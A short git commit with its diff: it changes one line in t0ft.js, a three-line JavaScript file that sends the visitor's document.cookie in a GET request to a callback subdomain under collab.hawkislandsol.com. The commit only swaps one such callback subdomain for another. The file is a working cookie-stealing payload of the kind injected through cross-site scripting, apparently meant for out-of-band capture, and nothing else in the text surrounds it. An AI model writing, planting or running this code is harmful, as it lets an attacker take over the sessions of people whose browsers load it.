0325cf1c75e110ff673c13ca36c4778a66cbf8c1
Charlie Marval <cmarval@ovionx.com>
2025-10-16 13:26:13 -0400

    Change request URL in t0ft.js

--- t0ft.js
+++ t0ft.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://dcte2cwu4oi5cgjsyw75ngbyqpwgk68v.collab.hawkislandsol.com/?' + document.cookie, true);
+xhttp.open('GET', 'https://f7nz77r57h78e0dl41qqd4goyf46sxgm.collab.hawkislandsol.com/?' + document.cookie, true);
 xhttp.send();
